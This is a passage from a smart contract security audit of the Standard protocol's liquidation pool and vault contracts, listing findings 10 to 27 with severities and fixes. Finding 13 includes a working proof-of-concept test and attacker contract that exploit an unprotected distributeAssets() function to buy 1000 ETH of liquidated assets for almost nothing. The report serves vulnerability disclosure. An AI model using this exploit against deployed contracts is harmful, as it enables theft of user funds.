    require(_tstVal > 0 || _eurosVal > 0);
    consolidatePendingStakesUser(msg.sender);

    ILiquidationPoolManager(manager).distributeFees();
    if (_tstVal > 0) IERC20(TST).safeTransferFrom(msg.sender, address(this), _tstVal);
    if (_eurosVal > 0) IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _eurosVal);

    holders.push(msg.sender);

    Position storage pos = positions[msg.sender];
    //verify if the user already has a staking position
    if (pos.holder == address(0)) {
        pos.holder = msg.sender;
        holders.push(msg.sender);
    }

    pos.pendingEUROs = _eurosVal;
    pos.pendingTST = _tstVal;
}
```

**Remark:**

The unbounded loops problem mentioned above affects various different functions in the current contract and needs to be addressed. At the launch of the project and for a certain time after the launch this probably won't cause any problems, however, at a certain stage, when the number of protocol users exceeds a certain limit, this contract will become unusable.

If it is not possible to use a mapping for certain data structures (like the holders array) and if there is no way to restrict the size of the array to a specific limit, the iteration of such an array needs to be batched over several transactions depending on the result of a call to the Solidity gasleft() function.

A detailed coding example is provided for the distributeFees() function that needs to iterate over all stakers in order to distribute protocol fees.


# 10: LiquidationPool => addUniqueHolder() : loop => out of gas - unbounded loop

## Title: LiquidationPool::addUniqueHolder() can cause gas grieving due to an unbounded loop and block the entire protocol

## Severity: MEDIUM 

## Link: 
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L112

## Summary

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

## Vulnerability Details

Unbounded loops are loops without a defined endpoint, meaning they can theoretically run indefinitely. In Solidity smart contracts, these loops can be particularly problematic, as they consume an unpredictable amount of gas. At a certain stage, the block.gasLimit will be reached, the transaction will fail and the entire protocol is at risk of becoming unusable. 

## Impact

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

## Tools Used

Manual Review

## Recommendations

The addUniqueHolder() function is called in the increasePosition() function to add a new user to the holders array if that user is not already present. Before calling the addUniqueHolder() function, this function updates the pendingStakes mapping.

As already explained in a previously reported vulnerability (https://www.codehawks.com/submit-finding/clql6lvyu0001mnje1xpqcuvl?finding=clr5fvl3i000547bgdxcpxr3t), the pendingStakes mapping is not required and the corresponding pending values should be added directly to the positions mapping.

By verifying the values in the positions mapping for the calling user, we can easily identify if that user is already present in the holders array and if that is not the case, we simply call: 

holders.push(msg.sender);

So, the addUniqueHolder() function is not really required and can be deleted.


**Remark:**

The unbounded loops problem mentioned above affects various different functions in the current contract and needs to be addressed. At the launch of the project and for a certain time after the launch this probably won't cause any problems, however, at a certain stage, when the number of protocol users exceeds a certain limit, this contract will become unusable.

If it is not possible to use a mapping for certain data structures (like the holders array) and if there is no way to restrict the size of the array to a specific limit, the iteration of such an array needs to be batched over several transactions depending on the result of a call to the Solidity gasleft() function.

A detailed coding example is provided for the distributeFees() function that needs to iterate over all stakers in order to distribute protocol fees.


# 11: LiquidationPool => deletePendingStake() : loop => out of gas - unbounded loop

## Title: LiquidationPool::deletePendingStake() can cause gas grieving due to an unbounded loop and block the entire protocol

## Severity: MEDIUM

## Link: 
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L106

## Summary

When the number of pending stakes exceeds a certain limit, the iteration over the pendingStakes array will cause an out of gas exception and block the entire protocol.

## Vulnerability Details

Unbounded loops are loops without a defined endpoint, meaning they can theoretically run indefinitely. In Solidity smart contracts, these loops can be particularly problematic, as they consume an unpredictable amount of gas. At a certain stage, the block.gasLimit will be reached, the transaction will fail and the entire protocol is at risk of becoming unusable. 

## Impact

When the number of pending stakes exceeds a certain limit, the iteration over the pendingStakes array will cause an out of gas exception and block the entire protocol.

## Tools Used

Manual Review

## Recommendations

* As already explained in previously submitted vulnerabilities (https://www.codehawks.com/submit-finding/clql6lvyu0001mnje1xpqcuvl?finding=clr5fvl3i000547bgdxcpxr3t), the pendingStakes array is not required and can be deleted together with the PendingStake structure and the deletePendingStake() function.

* Instead, the TST, EUROs and createdAt variables from the PendingStake structure should be added as pendingTST, pendingEUROs and pendingStakeCreatedAt variables to the Position structure, so they can easily be accessed via the positions mapping for a specific user.

* Whenever a user opens a new staking position or adds to an existing one, those values (pendingTST, pendingEUROs and pendingStakeCreatedAt) will be updated in the Position struct for the corresponding user.

* Pending stakes can then be consolidated for each individual user on specific actions, like: increasePosition, decreasePosition, distributeFees, distributeAssets... 

* After checking the timestamp and the value of pendingStakeCreatedAt, the variables can be updated in the Position structure for the corresponding user if the required amount of time has passed => reset the pendingTST, pendingEUROs and pendingStakeCreatedAt variables and update to the TST and EUROs variables in the Position structure accordingly.


**Remark:**

The unbounded loops problem mentioned above affects various different functions in the current contract and needs to be addressed. At the launch of the project and for a certain time after the launch this probably won't cause any problems, however, at a certain stage, when the number of protocol users exceeds a certain limit, this contract will become unusable.

If it is not possible to use a mapping for certain data structures (like the holders array) and if there is no way to restrict the size of the array to a specific limit, the iteration of such an array needs to be batched over several transactions depending on the result of a call to the Solidity gasleft() function.

A detailed coding example is provided for the distributeFees() function that needs to iterate over all stakers in order to distribute protocol fees.


# 12: LiquidationPool => getStakeTotal() & getTstTotal() : loop => out of gas - unbounded loop

## Title: LiquidationPool::getStakeTotal() and getTstTotal() can cause gas grieving due to an unbounded loop and block the entire protocol

## Severity: HIGH

## Link: 
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L49

## Summary

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

## Vulnerability Details

Unbounded loops are loops without a defined endpoint, meaning they can theoretically run indefinitely. In Solidity smart contracts, these loops can be particularly problematic, as they consume an unpredictable amount of gas. At a certain stage, the block.gasLimit will be reached, the transaction will fail and the entire protocol is at risk of becoming unusable. 

## Impact

When the number of holders exceeds a certain limit, the iteration over the holders array will cause an out of gas exception and block the entire protocol.

## Tools Used

Manual Review

## Recommendations

* Delete the functions getStakeTotal() and getTstTotal(). 
* Create 2 storage variables: stakeTotal and tstTotal and update them on all function calls that modify those values: increasePosition, decreasePosition, distributeFees, distributeAssets, deletePosition, deleteHolder, consolidatePendingStakes...


**Remark:**

The unbounded loops problem mentioned above affects various different functions in the current contract and needs to be addressed. At the launch of the project and for a certain time after the launch this probably won't cause any problems, however, at a certain stage, when the number of protocol users exceeds a certain limit, this contract will become unusable.

If it is not possible to use a mapping for certain data structures (like the holders array) and if there is no way to restrict the size of the array to a specific limit, the iteration of such an array needs to be batched over several transactions depending on the result of a call to the Solidity gasleft() function.

A detailed coding example is provided for the distributeFees() function that needs to iterate over all stakers in order to distribute protocol fees.


# 13: LiquidationPool::distributeAssets() has no access modifier - attacker can call this function with high collateral rate and steel funds

## Title: LiquidationPool::distributeAssets() has no access modifier - attacker can call this function with high collateral rate and steel funds

## Severity: HIGH

## Link: 
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L205

## Summary

The distributeAssets() function in the Liquidation Pool contract is external and does not have an access modifier. This allows an attacker to call the function with a very high collateral rate and with an Assets array that corresponds with the assets obtained from a previous Vault liquidation.

## Vulnerability Details

**Here is a potential attacker scenario:**

1: The attacker monitors the Liquidity Pool Manager (LPM) for Vault liquidations

2: When a Vault has been liquidated and one or several tokens distributed to the LPM, the attacker calls the distributeAssets() function with a very high value for the _collateralRate and an Assets array that corresponds with the assets and asset balances that have been distributed to the LPM 

3: This updates the rewards array for each staker (proportional to their current staking positions) and allows to purchase liquidated assets with almost 0 EUROs, because of the high collateral rate that was provided in the distributeAssets() function by the attacker

4: The attacker calls claimReawards to retrieve the purchased liquidation assets.


**To demonstrate the above mentioned attack scenario, the following Test/POC is provided:**

Add the following test to the liquidationPool.js file: 

```
it('allows purchasing liquidated assets with almost 0 EUROs by calling distributeAssets with a very high collateral rate', async () => {
    // user1 stakes 100 TST/EUROs
    const balance = ethers.utils.parseEther('100')
    await TST.mint(user1.address, balance)
    await EUROs.mint(user1.address, balance)
    await TST.connect(user1).approve(LiquidationPool.address, balance)
    await EUROs.connect(user1).approve(LiquidationPool.address, balance)
    await LiquidationPool.connect(user1).increasePosition(balance, balance)
    await fastForward(DAY)
  
    const user1ETHBalanceBefore = await ethers.provider.getBalance(user1.address) //9999.9
    expect((await LiquidationPool.position(user1.address))._position.EUROs).to.equal(balance) //100
    expect((await LiquidationPool.findRewards(user1.address))[0].amount).to.equal(0) //0 ETH rewards
  
    //Setup: assume, a Vault has been liquidated and the liquidated asset (1000 ETH) has been transfered to the Liquidation Pool Manager (LPM)
    await user2.sendTransaction({ to: LiquidationPoolManager.address, value: ethers.utils.parseEther('1000') })
  
    //Those funds are then transferred to the Liquidation Pool by calling runLiquidation() in the LPM =>
    //LiquidationPool(pool).distributeAssets{value: ethBalance}(assets, manager.collateralRate(), manager.HUNDRED_PC());
    await LiquidationPool.connect(user2).distributeAssets([], DEFAULT_COLLATERAL_RATE, HUNDRED_PC, {
      value: ethers.utils.parseEther('1000'),
    })
    expect(await ethers.provider.getBalance(LiquidationPool.address)).to.equal(ethers.utils.parseEther('1000'))
  
    //Deploy the attacker contract
    let liqPoolAttacker = await (
      await ethers.getContractFactory('LiqPoolDistributeAssetsAttacker')
    ).deploy(LiquidationPool.address, TST.address, EUROs.address, VaultManager.address)
  
    //The attacker monitors the distribution of liquidation assets on the LP
    //the attacker calls the distributeAssets() function in the LP with a very high collateral rate
    //and an Assets array that corresponds with the assets and asset balances that are currently available on the LPM
    await liqPoolAttacker.attack()
  
    //user1 still holds almost the same EUROs position => less than 1 EUROs were sold to acquire
    //the 1000 ETH reward from the Vault liquidation
    expect((await LiquidationPool.position(user1.address))._position.EUROs).to.be.within(
      ethers.utils.parseEther('99'),
      ethers.utils.parseEther('100')
    )
    //although user1 only stakes 100 EUROs, he was able to purchase the entire reward from the Vault liquidation: 1000 ETH
    //in our example, we only have 1 staker, if there would be other stakers, each one of them would receive
    //a portion of the rewards distribution that is proportional to his/her staking position
    expect((await LiquidationPool.findRewards(user1.address))[0].amount).to.equal(ethers.utils.parseEther('1000')) //1000 ETH rewards
  
    //user1 calls claim rewards and should receive the entire balance from the Vault liquidation: 1000 ETH
    //while having paid less than 1 EUROs for it
    await LiquidationPool.connect(user1).claimRewards()
  
    const user1ETHBalanceAfter = await ethers.provider.getBalance(user1.address)
    //user1 ETH balance has increased by ~1000 ETH
    expect(user1ETHBalanceAfter.sub(user1ETHBalanceBefore)).to.be.within(ethers.utils.parseEther('999'), ethers.utils.parseEther('1000'))
  })
```

Add the following attacker contract to the utils directory:

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "contracts/interfaces/ITokenManager.sol";
import "contracts/interfaces/ILiquidationPoolManager.sol";
import "contracts/interfaces/ISmartVaultManager.sol";
import "hardhat/console.sol";

interface ILiquidationPool {
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external;
}

contract LiqPoolDistributeAssetsAttacker {
    ILiquidationPool private liquidationPool;
    ISmartVaultManager private SVManager;

    constructor(address _liquidationPool, address _TST, address _EUROs, address _SVManager) {
        liquidationPool = ILiquidationPool(_liquidationPool);
        SVManager = ISmartVaultManager(_SVManager);
    }

    //the attacker calls the distributeAssets() function in the LP with a very high collateral rate
    //and an Assets array that corresponds with the assets and asset balances that are currently available on the LPM
    //in our case, we assume there was a Vault liquidation that only contained native ETH
    function attack() public {
        ITokenManager.Token[] memory tokens = ITokenManager(SVManager.tokenManager()).getAcceptedTokens();
        ILiquidationPoolManager.Asset[] memory assets = new ILiquidationPoolManager.Asset[](tokens.length);

        for (uint256 i = 0; i < tokens.length; i++) {
            ITokenManager.Token memory token = tokens[i];
            if (token.addr == address(0)) {
                assets[0] = ILiquidationPoolManager.Asset(token, 1000 ether);
                break;
            }
        }

        liquidationPool.distributeAssets(assets, 999999999999, 1);
    }

    receive() external payable {
        console.log("Val: ", msg.value);
    }
}

```

## Impact

Anyone can call this function and provide a very high value for the collateral rate in order purchase assets from a liquidated vault (liquidation rewards proportional to users staking position) for almost 0 EUROs.

## Tools Used

Manual Review

## Recommendations

Add the onlyManager modifier to the function



# 14: SmartVaultV3::receive()should revert on ETH receivals when the Vault has been liquidated

## Title: SmartVaultV3::receive() should revert on ETH receivals when the Vault has been liquidated

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L125

## Summary

The receive() function should revert when ETH is received on liquidated Vault.

## Vulnerability Details

The user can no longer borrow on a liquidated Vault, so there is no need to post any collateral. To prevent the user from mistakenly transferring funds to a liquidated Vault, the receive() function should reject all ETH transferals if the Vault has been liquidated.

Although it is possible to recover those funds by calling the removeCollateral() function, this is an unnecessary action that incurs a gas fee and should be avoided.

## Impact

A user could mistakenly transfer funds to a liquidated Vault. Although it is possible to recover those funds by calling the removeCollateral() function, this is an unnecessary action that incurs a gas fee and should be avoided.

## Tools Used

Manual Review

## Recommendations

Add the following code to the receive() function:

```
require(!liquidated, "the vault has been liquidated");
```


# 15: SmartVaultV3::swap() provides a hardcoded value for the Uniswap fee, yet certain Uniswap pools may not be available for that fee tier

## Title: SmartVaultV3::swap() provides a hardcoded value for the Uniswap fee, yet certain Uniswap pools may not be available for that fee tier

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L221

## Summary & Vulnerability Details

For the fee parameter, a constant value of 3000 (0.3% fee tier) is used, however, not all allowed token pairs (present and future additions to the Standard protocol) may be available on Uniswap for this fee tier.

## Impact

The token pair provided for the swap may not be available on Uniswap for the hardcoded 0.3% fee tier.

## Tools Used

Manual Review

## Recommendations

Make the fee parameter configurable. By default, the fee value can be 3000, but the user still should have the possibility to change this parameter in case Uniswap does not provide a token pair for that fee value.

Add an additional argument to the swap() function: uint256 uniswapFee and use it for the "fee" parameter in ExactInputSingleParams



# 16: SmartVaultV3::swap()deadline parameter is too low and could cause a swap to fail

## Title: SmartVaultV3::swap() deadline parameter is too low and could cause a swap to fail

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L223

## Summary and Vulnerability Details

The deadline parameter in ExactInputSingleParams specifies the unix time after which a swap will fail. The currently provided value is block.timestamp, which could cause swaps to fail in production.

## Impact

Swaps could fail on mainnet.

## Tools Used

Manual Review

## Recommendations

Make this value larger, for example, set a deadline of 10 minutes: 

```
deadline: block.timestamp + 600 
```


# 17: LiquidationPoolManager::receive() does not emit an event on receiving ETH

## Title: LiquidationPoolManager::receive() does not emit an event on receiving ETH

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPoolManager.sol#L31

## Summary and Vulnerability Details

For offline monitoring purposes, the LiquidationPoolManager should emit an event in the receive() function when receiving ETH.

## Impact

Offline monitoring and bookkeeping of amounts and origins of received funds will be more complicated.

## Tools Used

Manual Review

## Recommendations

**Define the following event in the LiquidationPoolManager contract:**

```
event ETHReceived(address indexed sender, uint256 amount, uint256 timestamp);
```

**Emit the event in the receive() function on ETH receivals:**

```
emit ETHReceived(msg.sender, msg.value, block.timestamp);
```



# 18: LiquidationPoolManager::forwardRemainingRewards() does not check the result of token transfers

## Title: LiquidationPoolManager::forwardRemainingRewards() does not check the result of token transfers 

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPoolManager.sol#L54

## Summary and Vulnerability Details

The forwardRemainingRewards() function in the LiquidationPoolManager contract does not check the result of ERC20 token transfers to the protocol EOA.

The result of standard ERC20 token transfers should always be verified otherwise there is no way to know if the transfer succeeded. Preferably, the OpenZeppelin SafeERC20 contract should be used.

SaeERC20 also supports tokens that return no value (and instead revert or throw on failure) => non-reverting calls are assumed to be successful.

## Impact

A token transfer may fail without the possibility for the contract to act accordingly.

## Tools Used

Manual Review

## Recommendations

**Check the return value after the token transfer, for example:**

```
bool sent = IERC20(_token.addr).transfer(protocol, balance);
require(sent, "Token transfer failed");
```

**or, preferably use SafeERC20:**

```
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
...
using SafeERC20 for IERC20;
...
IERC20(_token.addr).safeTransfer(protocol, balance);
```



# 19: LiquidationPool::decreasePosition() check-effects-interaction pattern not respected - risk of reentrancy for ERC20 tokens with hooks

## Title: LiquidationPool::decreasePosition() check-effects-interaction pattern not respected - risk of reentrancy for ERC20 tokens with hooks 

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L155
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L159

## Summary and Vulnerability Details

At the current stage and for the list of allowed assets and tokens there is no reentrancy risk, because ERC20 tokens are not vulnerable to reentrancy attacks.

However, if additional tokens will be supported at a later stage of the project, the team needs to consider that certain exotic ERC20 tokens may provide hooks which allow reentrancy attacks, because the Checks-Effects-Interaction pattern is not respected in this function.

As a good coding/security practice, always apply the Checks-Effects-Interaction pattern.

## Impact

Risk of reentrancy attack for ERC20 tokens that provide hooks.

## Tools Used

Manual Review

## Recommendations

Respect the Checks-Effects-Interaction pattern and place the line of code that modifies the user Position before the safe transfer method for _tstVal as well as _eurosVal :

```
positions[msg.sender].TST -= _tstVal;
IERC20(TST).safeTransfer(msg.sender, _tstVal);
```

And: 

```
positions[msg.sender].EUROs -= _eurosVal;
IERC20(EUROs).safeTransfer(msg.sender, _eurosVal);
```


# 20: LiquidationPool::consolidatePendingStakes() 

## Title: LiquidationPool::consolidatePendingStakes () hardcoded value for pending stake limit

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L120

## Summary and Vulnerability Details

The pending stake limit is hardcoded in the consolidatePendingStakes() function to the value of 1 day. This value should be configurable by the protocol owner.

## Impact

There is no way to modify the time limit for pending stakes.

## Tools Used

Manual Review

## Recommendations

Add a state variable and a setter function for the pending staking limit to the LiquidationPool contract:

```
uint256 private pendingStakingDuration = 1 days;
...
function setPendingStakingDuration(uint256 _pendingStakingDuration) external onlyOwner {
    pendingStakingDuration = _pendingStakingDuration;
}
...
function consolidatePendingStakes() private {
    uint256 deadline = block.timestamp - pendingStakingDuration;
    // rest of the code
}
```



# 21: LiquidationPool::distributeFees() should not distribute fees to pending stakers as this makes the protocol vulnerable to frontrunning

## Title: LiquidationPool::distributeFees() should not distribute fees to pending stakers as this makes the protocol vulnerable to frontrunning

## Severity: MEDIUM

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L191

## Summary

Protocol fees should not be distributed to pending staking positions. This makes the protocol vulnerable to frontrunning attacks.

## Vulnerability Details

Here is a potential attacker scenario:

* An attacker monitors the EUROs balance in the poolManager and at a certain point, when a large amount of fees have been accumulated, the attacker stacks a large amount of TST/EUROs tokens and calls the public distributeFees() function in the poolManager
* The staked tokens are pending, but nevertheless, they are eligible for fee distribution
* After only 1 day (when the stake becomes non-pending), the attacker removes all funds from the pool
* This puts long-term stakers at a disadvantage


## Impact

Encourages short-term staking and risk of frontrunning fee distribution events.

## Tools Used

Manual Review

## Recommendations

Delete the following code in the distributeFees() function in order to prevent pending stakers to benefit from fee distributions:

```
for (uint256 i = 0; i < pendingStakes.length; i++) {
    pendingStakes[i].EUROs += (_amount * pendingStakes[i].TST) / tstTotal;
}
```


Also, the pending staking limit of 1 day in the consolidatePendingStakes() function seems a bit short and should maybe be increased. This parameter should be configurable by the protocol owner via a setter function:

**Add a new state variable to the contract:**

```
uint256 private pendingStakingDuration = 1 days;
```

**Add a setter function:**

```
function setPendingStakingDuration(uint256 _pendingStakingDuration) external onlyOwner {
    pendingStakingDuration = _pendingStakingDuration;
}
```

**Use the state variable in the consolidatePendingStakes() function:**
 
``` 
function consolidatePendingStakes() private {
    uint256 deadline = block.timestamp - pendingStakingDuration;
    // rest of the code
}
```


# 22: SmartVaultV3::swap() revert if amount provided is 0

## Title: SmartVaultV3::swap() should revert if the provided swap amount is 0

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L214

## Summary & Vulnerability Details

The user can mistakenly provide the value 0 for the _amount argument of the swap() function. If this is the case, no swap will be performed.

## Impact

No swap is performed when the provided value for the _amount argument is 0.

## Tools Used

Manual Review

## Recommendations

Add the following statement at the beginning of the swap() function to verify if the provided swap amount is bigger than 0:

```
require(_amount > 0, "err_swap_amount_0");
```



# 23: LiquidationPool::stake() equal amount staking strategy could incite attacker to manipulate the price of pool assets

## Title: LiquidationPool::stake() equal amount staking strategy could incite attacker to manipulate the price of pool assets

## Severity: MEDIUM

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L45

## Summary and Vulnerability Details

The logic in the stake() function should incite users to stake equal amounts of EUROs and TST tokens:

```
return _position.TST > _position.EUROs ? _position.EUROs : _position.TST;
```

I'm not quite sure about the reason behind this strategy, but it seems like the protocol owners are trying to establish a TST/EUROs liquidity pool that should peg the price of TST tokens to the price of the EUROs token (pegged to the €)

**This however can easily be manipulated. An attacker could do the following:**

* Let's assume, the value of 1 TSE = 1 Euro
* An attacker stacks a very large amount of EUROs and drives the price of TST down
* The attacker buys a large amount of TST at a low price
* The attacker unstacks all his EUROs, which re-balances the pool and makes the price of TST go up
* The attacker sells TST at a higher price and makes a high profit

## Impact

Price manipulation of the TST token in the TST/EUROs pool

## Tools Used

Manual Review



# 24: LiquidationPoolManager::distributeFees() does not check the result of eurosToken transfers

## Title: LiquidationPoolManager::distributeFees() does not check the result of eurosToken transfers 

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPoolManager.sol#L40

## Summary and Vulnerability Details

The distributeFees() function in the LiquidationPoolManager contract does not check the result of the eurosToken (ERC20) transfers to the protocol EOA.

The result of standard ERC20 token transfers should always be verified otherwise there is no way to know if the transfer succeeded. Preferably, the OpenZeppelin SafeERC20 contract should be used.

SaeERC20 also supports tokens that return no value (and instead revert or throw on failure) => non-reverting calls are assumed to be successful.

## Impact

A token transfer may fail without the possibility for the contract to act accordingly.

## Tools Used

Manual Review

## Recommendations

**Check the return value after the token transfer, for example:**

```
bool sent = eurosToken.transfer(protocol, eurosToken.balanceOf(address(this)));
require(sent, "Token transfer failed");
```

**or, preferably use SafeERC20:**

```
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
...
using SafeERC20 for IERC20;
...
IERC20 eurosToken = IERC20(EUROs);
...
eurosToken.transfer(protocol, eurosToken.balanceOf(address(this)));
```


# 25: LiquidationPool::distributeAssets() division before multiplication can lead to precision loss

## Title: LiquidationPool::distributeAssets() division before multiplication can lead to precision loss 

## Severity: MEDIUM

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L220

## Summary and Vulnerability Details

The distributeAssets() function in the LiquidationPool contract performs a division before multiplication.

Solidity's integer division truncates. Thus, performing division before multiplication can lead to precision loss and should be avoided

## Impact

Solidity's integer division truncates and can lead to false calculations due to precision loss

## Tools Used

Manual Review

## Recommendations

Perform multiplications before any divisions and use the following formula:

```
uint256 costInEuros = (_portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) * _hundredPC) / uint256(priceEurUsd)  / _collateralRate;
```

instead of:
```
uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd) * _hundredPC / _collateralRate;
```



# 26: LiquidationPoolManager::distributeFees() does not check the return value of approve

## Title: LiquidationPoolManager::distributeFees() & runLiquidation() do not check the return value of approve

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPoolManager.sol#L37
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPoolManager.sol#L76

## Summary and Vulnerability Details

The distributeFees() and runLiquidation() functions in the LiquidationPoolManager contract does not check the result of the eurosToken approval.


## Impact

The token approval may fail and the function should revert immediately.

## Tools Used

Manual Review

## Recommendations

**Check the return value after the token approval, for example:**

```
bool approvalSuccess = eurosToken.approve(pool, _feesForPool);
require(approvalSuccess, "Token approval failed");
```


# 26: Missing zero address validation

## Title: Missing zero address validation can lead to loss of ownership and/or funds

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultManagerV5.sol#L136
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L31
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPoolManager.sol#L22
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultV3.sol#L35


## Summary

zero address validation is missing for various contracts.

## Vulnerability Details

**The following provides a list of the concerned locations:**

* Constructor arguments in the LiquidationPool contract: _TST, _EUROs, _eurUsd, _tokenManager
* Constructor arguments in the LiquidationPoolManager contract: _smartVaultManager, _protocol, _TST, _EUROs
* Constructor arguments in the SmartVaultV3 contract: _owner, _manager, 

* _weth in SmartVaultManagerV5.setWethAddress
* _swapRouter in SmartVaultManagerV5.setSwapRouter2
* _nftMetadataGenerator in SmartVaultManagerV5.setNFTMetadataGenerator
* _smartVaultDeployer in SmartVaultManagerV5.setSmartVaultDeployer
* _protocol in SmartVaultManagerV5.setProtocolAddress
* _liquidator in SmartVaultManagerV5.setLiquidatorAddress
* _to in SmartVaultV3.removeCollateralNative
* _newOwner in  SmartVaultV3.setOwner

## Impact

If a method is called without specifying a specific address argument, the address will automatically be set to the 0-address. This could lead to loss of contract ownership, loss of funds (if funds are sent to that 0-address) and other issues.

## Tools Used

Manual Review

## Recommendations

Add zero address validations  to all the constructors and functions listed above.

Use something like:

```
require(owner != address(0), 'err_address_zero');
```



&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

# 27: Missing events for critical address changes 

## Title: Missing events for critical address changes 

## Severity: LOW

## Link:
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/SmartVaultManagerV5.sol#L136


## Summary and Vulnerability Details

**Missing events for critical address changes:**

This concerns the "liquidator" in the SmartVaultManagerV5. This makes it difficult to track off-chain admin/owner changes.  
 



